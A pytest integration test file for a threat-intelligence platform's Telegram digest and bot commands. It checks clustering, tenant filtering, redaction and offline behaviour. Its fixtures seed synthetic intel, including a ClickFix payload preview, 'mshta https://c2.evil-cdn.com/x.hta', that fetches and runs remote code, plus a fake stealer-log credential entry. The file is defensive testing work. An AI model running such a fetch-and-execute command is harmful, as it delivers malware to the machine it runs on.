"""Telegram digest and DB-backed commands on PostgreSQL (TELEGRAM.md §9): grouping by cluster, tenant filtering,
heartbeat, idempotent cursor, preview, and /latest /pack /ioc /cve /status without any external network."""

from __future__ import annotations

import asyncio
import json
import os
import re
import socket
from datetime import UTC, datetime, timedelta
from pathlib import Path

import httpx
import pytest
import yaml

pytestmark = pytest.mark.integration
if not os.environ.get("HC_TEST_DATABASE_URL"):
    pytest.skip("HC_TEST_DATABASE_URL not set", allow_module_level=True)

from alembic import command  # noqa: E402
from alembic.config import Config  # noqa: E402
from sqlalchemy import func, select  # noqa: E402
from sqlalchemy.ext.asyncio import async_sessionmaker  # noqa: E402

from app.collectors.base import IntelSignal, Observable  # noqa: E402
from app.collectors.reference_data import Dataset, dataset_signal  # noqa: E402
from app.collectors.telegram_cti import CtiMessage, TenantWatch, scan_message  # noqa: E402
from app.core.config import Settings  # noqa: E402
from app.db.models import HuntingPack, PivotedCluster, ReferenceDataset, TelegramDigest, Tenant  # noqa: E402
from app.db.session import build_engine, session_scope  # noqa: E402
from app.integrations.telegram.bot import Bot  # noqa: E402
from app.integrations.telegram.client import TelegramClient  # noqa: E402
from app.integrations.telegram.digest import run_digest  # noqa: E402
from app.processors.leak_redactor import account_key  # noqa: E402
from app.schemas.enums import AttackVector, DigestStatus, IntelSource  # noqa: E402
from app.schemas.hunting_pack import HuntingPackV2  # noqa: E402
from app.schemas.manifest import TenantManifest  # noqa: E402
from app.services.cluster_builder import cluster_pending_events  # noqa: E402
from app.services.intel_store import store_signals  # noqa: E402
from app.services.pack_builder import build_packs  # noqa: E402
from app.services.tenant_registry import upsert_tenant  # noqa: E402
from tests.fakes import synthetic_whitelist  # noqa: E402
from tests.telegram_fakes import CHAT, TOKEN, USER, FakeAsyncRedis, FakeTelegram, no_sleep  # noqa: E402

ROOT = Path(__file__).resolve().parent.parent
SECRET_A, SECRET_B = "a" * 40, "b" * 40


@pytest.fixture(scope="module", autouse=True)
def migrated_db():
    cfg = Config(str(ROOT / "alembic.ini"))
    cfg.set_main_option("script_location", str(ROOT / "migrations"))
    command.downgrade(cfg, "base")
    command.upgrade(cfg, "head")
    yield
    command.downgrade(cfg, "base")


@pytest.fixture(scope="module")
def world():
    """Two tenants; KEV, ClickFix, credential exposure and LOLDrivers intel; packs built (no LLM)."""
    now = datetime.now(UTC)

    async def setup():
        engine = build_engine(pooled=False)
        try:
            sample = TenantManifest.from_yaml_file(ROOT / "config/tenant_manifest.yaml")
            raw = yaml.safe_load((ROOT / "config/tenant_manifest.yaml").read_text(encoding="utf-8"))
            raw["tenant"] = {"slug": "acme", "display_name": "Acme"}
            raw["brand"] = {"domains": ["acme-corp.example"], "keywords": ["acmecorp"]}
            raw["delivery"] = {"mode": "pull", "secret_env": "HC_TENANT_ACME_HMAC_SECRET",
                               "api_token_env": "HC_TENANT_ACME_API_TOKEN"}  # fmt: skip
            acme = TenantManifest.model_validate(raw)
            async with session_scope(engine) as s:
                tc, _ = await upsert_tenant(s, sample, webhook_secret=SECRET_A, api_token="t" * 40)
                await upsert_tenant(s, acme, webhook_secret=SECRET_B, api_token="u" * 40)
                watch = TenantWatch(tc.id, ["tencongty.vn"], sample.portal_hostnames(), account_key(SECRET_A))
                leak = "Lumma logs\nURL: https://sso.tencongty.vn/\nUsername: a.nguyen@tencongty.vn\nPassword: x\n"
                signals = scan_message(CtiMessage("@feed", 7, now, leak, False), [watch])
                signals += [
                    IntelSignal(source=IntelSource.CISA_KEV, external_id="CVE-2026-1111",
                                attack_vector=AttackVector.EDGE_DEVICE_EXPLOIT, title="CVE-2026-1111 Fortinet FortiOS",
                                observed_at=now,
                                raw_payload={"kev": {"cveID": "CVE-2026-1111", "vendorProject": "Fortinet",
                                                     "product": "FortiOS"}, "epss": {"epss": 0.4, "percentile": 0.95},
                                             "epss_alert": True, "nuclei_templates": [],
                                             "matched_tenants": {"tencongty": ["fortinet:fortios"],
                                                                 "acme": ["fortinet:fortios"]},
                                             "pocs": [{"repo": "r/poc", "likely_fake": False, "files": {}}]},
                                observables=[Observable(type="cve", value="CVE-2026-1111")]),
                    IntelSignal(source=IntelSource.URLSCAN, external_id="scan-1",
                                attack_vector=AttackVector.CLICKFIX_FILELESS, title="ClickFix lure on lure-site.com",
                                observed_at=now,
                                raw_payload={"lure_page": "https://lure-site.com/",
                                             "payload_previews": ["mshta https://c2.evil-cdn.com/x.hta"],
                                             "unpack_layers": [{"depth": 0, "technique": "input"},
                                                               {"depth": 1, "technique": "encodedcommand"}]},
                                observables=[Observable(type="domain", value="lure-site.com"),
                                             Observable(type="domain", value="c2.evil-cdn.com")]),
                ]  # fmt: skip
                drivers = Dataset("loldrivers", [{"id": "d1", "category": "vulnerable driver", "created": "2026-10-01",
                                                  "filenames": ["rtcore64.sys"], "sha256": ["c" * 64]}])  # fmt: skip
                s.add(ReferenceDataset(name="loldrivers", version=drivers.version, record_count=1,
                                       records=drivers.records, fetched_at=now))  # fmt: skip
                signals.append(dataset_signal(drivers, set()))
                assert await store_signals(s, signals) == 4
            wl = synthetic_whitelist(tenant_domains=("tencongty.vn", "acme-corp.example"))
            async with session_scope(engine) as s:
                assert await cluster_pending_events(s, wl, now=now + timedelta(minutes=31)) == 4
            async with session_scope(engine) as s:
                assert await build_packs(s, now=now) == 7  # V2, V3, V5 for both tenants + V1 exposure for one
        finally:
            await engine.dispose()

    asyncio.run(setup())
    return now


@pytest.fixture
async def maker():
    engine = build_engine(pooled=False)
    yield async_sessionmaker(engine, expire_on_commit=False)
    await engine.dispose()


def _settings(**kw) -> Settings:
    base = {"tgbot_enabled": True, "tgbot_token": TOKEN, "tgbot_chat_ids": [CHAT], "tgbot_allowed_user_ids": [USER]}
    return Settings(**(base | kw))


def _client(fake: FakeTelegram) -> TelegramClient:
    return TelegramClient(TOKEN, http=httpx.AsyncClient(transport=fake.transport()), sleep=no_sleep)


def _assert_safe(texts: list[str]) -> None:
    joined = "\n".join(texts)
    assert TOKEN not in joined and "http://" not in joined and "https://" not in joined
    assert "a.nguyen" not in joined and not re.search(r"\b[0-9a-f]{64}\b", joined)  # no identities, refs or hashes


async def _cursor(maker) -> TelegramDigest | None:
    async with maker() as s:
        return await s.scalar(select(TelegramDigest).where(TelegramDigest.status == DigestStatus.SENT)
                              .order_by(TelegramDigest.created_at.desc()).limit(1))  # fmt: skip


# --- digest ---------------------------------------------------------------------------------------------
async def test_digest_failure_does_not_move_the_cursor_and_retry_covers_the_window(world, maker):
    down = FakeTelegram()
    down.fail_with = httpx.Response(502, text="bad gateway")
    out = await run_digest(maker, _client(down), FakeAsyncRedis(), _settings(), sleep=no_sleep)
    assert out["status"] == "failed" and TOKEN not in out["error"]
    assert await _cursor(maker) is None

    fake = FakeTelegram()
    out = await run_digest(maker, _client(fake), FakeAsyncRedis(), _settings(), sleep=no_sleep)
    assert out == {"status": "sent", "messages": 1, "clusters": 4}
    [text] = fake.texts()
    print(text)  # shown by pytest only when an assertion below fails
    _assert_safe([text])
    clickfix = next(line for line in text.splitlines() if "V3 ClickFix" in line)
    assert "c2[.]evil-cdn[.]com" in clickfix and clickfix.endswith("acme, tencongty")  # one line per cluster
    assert "credential exposure" in text
    assert "a***n@tencongty.vn" in text
    assert "families: lumma" in text
    assert "<code>CVE-2026-1111</code>" in text and "EPSS p95" in text and "credible PoC: yes" in text
    assert "loldrivers: 1 records, 1 new" in text and "<b>Health</b>" in text
    assert "Clusters: 4 (new 4, updated 0)" in text

    async with maker() as s:
        failed = await s.scalar(select(func.count(TelegramDigest.id)).where(TelegramDigest.status == "failed"))
        max_seq = await s.scalar(select(func.max(HuntingPack.seq)))
    cursor = await _cursor(maker)
    assert failed == 1 and cursor.max_pack_seq == max_seq and cursor.message_ids and cursor.max_link_at


async def test_nothing_new_gives_a_heartbeat_or_nothing(world, maker):
    fake = FakeTelegram()
    assert (await run_digest(maker, _client(fake), FakeAsyncRedis(), _settings(), sleep=no_sleep))["status"] == "sent"
    [text] = fake.texts()
    assert "No new intelligence since" in text
    assert "10 collectors not reported yet" in text  # empty Redis: never claimed healthy

    quiet = FakeTelegram()
    out = await run_digest(maker, _client(quiet), FakeAsyncRedis(), _settings(tgbot_send_empty_digest=False),
                           sleep=no_sleep)  # fmt: skip
    assert out == {"status": "empty"} and quiet.calls == []


async def test_preview_never_moves_the_cursor_and_new_packs_reach_the_next_digest(world, maker):
    before = await _cursor(maker)
    async with maker() as s:  # a new pack version for one cluster
        cluster = await s.scalar(select(PivotedCluster).where(PivotedCluster.cluster_key == "v3:c2:c2.evil-cdn.com"))
        cluster.observables = {**cluster.observables, "domains_block": [*cluster.observables["domains_block"],
                                                                         "c2b.evil-cdn.com"]}  # fmt: skip
        await s.commit()
    async with maker() as s:
        assert await build_packs(s, now=world) == 2
        await s.commit()

    preview = FakeTelegram()
    out = await run_digest(maker, _client(preview), FakeAsyncRedis(), _settings(), preview_chat_id=CHAT, sleep=no_sleep)
    assert out["status"] == "preview" and "(preview, cursor not moved)" in preview.texts()[0]
    assert "Clusters: 1 (new 0, updated 1)" in preview.texts()[0]
    assert (await _cursor(maker)).id == before.id

    fake = FakeTelegram()
    await run_digest(maker, _client(fake), FakeAsyncRedis(), _settings(), sleep=no_sleep)
    assert "Clusters: 1 (new 0, updated 1)" in fake.texts()[0] and (await _cursor(maker)).id != before.id


async def test_tenant_filter_applies_to_digest_content(world, maker):
    async with maker() as s:  # rewind the cursor: drop sent rows so the next run covers everything again
        for row in (await s.scalars(select(TelegramDigest))).all():
            await s.delete(row)
        await s.commit()
    fake = FakeTelegram()
    await run_digest(maker, _client(fake), FakeAsyncRedis(), _settings(tgbot_tenants=["acme"]), sleep=no_sleep)
    text = fake.texts()[0]
    assert "tencongty" not in text.replace("@tencongty.vn", "") and "credential exposure" not in text
    assert "Clusters: 3" in text


# --- commands ---------------------------------------------------------------------------------------------
@pytest.fixture
def offline(monkeypatch):
    """Any DNS lookup fails the test: the commands may only talk to PostgreSQL (127.0.0.1) and the fake Bot API."""

    def refuse(*args, **kwargs):
        raise AssertionError(f"external lookup attempted: {args[:1]}")

    monkeypatch.setattr(socket, "getaddrinfo", refuse)


async def _run(maker, text: str, **settings) -> FakeTelegram:
    fake = FakeTelegram()

    async def whitelist(domains, networks):
        return synthetic_whitelist(tenant_domains=tuple(domains))

    bot = Bot(_settings(**settings), _client(fake), maker, FakeAsyncRedis(), whitelist_factory=whitelist,
              sleep=no_sleep)  # fmt: skip
    await bot.handle_update({"update_id": 1, "message": {"chat": {"id": CHAT}, "from": {"id": USER}, "text": text}})
    assert all(method in ("sendMessage", "sendDocument") for method, _ in fake.calls)
    return fake


async def test_ioc_and_cve_use_the_database_only(world, maker, offline):
    fake = await _run(maker, "/ioc hxxps://c2[.]evil-cdn[.]com/x.hta")
    [text] = fake.texts()
    _assert_safe([text])
    assert "Whitelist: <b>block</b>" in text and "V3 ClickFix" in text and "c2[.]evil-cdn[.]com" in text

    owned = (await _run(maker, "/ioc sso.tencongty.vn")).texts()[0]
    assert "<b>drop</b> (tenant_owned)" in owned and "No matching cluster." in owned

    cve = (await _run(maker, "/cve cve-2026-1111")).texts()[0]
    assert "EPSS: p95" in cve and "Matched tenants: acme, tencongty" in cve and "Packs: 2" in cve
    assert "not tracked" in (await _run(maker, "/cve CVE-2099-0001")).texts()[0]
    assert "Matched tenants: acme" in (await _run(maker, "/cve CVE-2026-1111", tgbot_tenants=["acme"])).texts()[0]


async def test_pack_sends_summary_and_files_and_rejects_ambiguous_prefixes(world, maker, offline):
    async with maker() as s:
        pack = await s.scalar(select(HuntingPack).where(HuntingPack.attack_vector == AttackVector.CLICKFIX_FILELESS)
                              .order_by(HuntingPack.seq).limit(1))  # fmt: skip
    fake = await _run(maker, f"/pack #{str(pack.id)[:8]}")
    [summary] = fake.texts()
    _assert_safe([summary])
    assert f"<code>{pack.id}</code>" in summary and "Tasks (" in summary
    docs = fake.documents()
    tasks = pack.payload["internal_hunting_tasks"]
    assert [name for name, _ in docs] == [f"pack-{pack.id}.json", *(f"{t['task_id']}.yml" for t in tasks),
                                          f"queries-{pack.id}.txt"]  # fmt: skip
    assert HuntingPackV2.model_validate(json.loads(docs[0][1])).pack_id == pack.id  # valid pack JSON
    for (_, sigma), task in zip(docs[1:-1], tasks, strict=True):
        assert yaml.safe_load(sigma)["title"] and sigma.decode() == task["sigma_yaml"]  # valid Sigma YAML
    assert b"# Wazuh / OpenSearch DSL" in docs[-1][1]

    async with maker() as s:  # two packs sharing an 8-character prefix
        example = json.loads((ROOT / "contracts/examples/clickfix_pack.example.json").read_text(encoding="utf-8"))
        for i, conf in ((1, 61), (2, 62)):
            data = {**example, "pack_id": f"abcdef12-0000-4000-8000-00000000000{i}", "confidence_score": conf}
            data.pop("expires_at")
            s.add(HuntingPack.from_contract(HuntingPackV2.model_validate(data), tenant_id=pack.tenant_id,
                                            cluster_id=pack.cluster_id, delivery_mode="pull", version=10 + i))  # fmt: skip
        await s.commit()
    assert "Ambiguous prefix" in (await _run(maker, "/pack abcdef12")).texts()[0]
    full_id = "abcdef12-0000-4000-8000-000000000001"
    assert f"Pack</b> <code>{full_id}</code>" in (await _run(maker, f"/pack {full_id}")).texts()[0]
    assert "No pack matches" in (await _run(maker, "/pack ffffffff")).texts()[0]
    async with maker() as s:
        owner = await s.scalar(select(Tenant.slug).where(Tenant.id == pack.tenant_id))
    hidden = "acme" if owner == "tencongty" else "tencongty"
    assert "No pack matches" in (await _run(maker, f"/pack {full_id}", tgbot_tenants=[hidden])).texts()[0]


async def test_latest_status_and_digest_preview_commands(world, maker, offline):
    latest = (await _run(maker, "/latest 3")).texts()[0]
    assert "Latest 3 clusters" in latest
    _assert_safe([latest])
    status = (await _run(maker, "/status")).texts()[0]
    assert "<b>Database</b>" in status and "active tenants: 2" in status and "LLM: off" in status
    before = await _cursor(maker)
    preview = (await _run(maker, "/digest")).texts()[0]
    assert "preview, cursor not moved" in preview
    after = await _cursor(maker)
    assert (before.id if before else None) == (after.id if after else None)
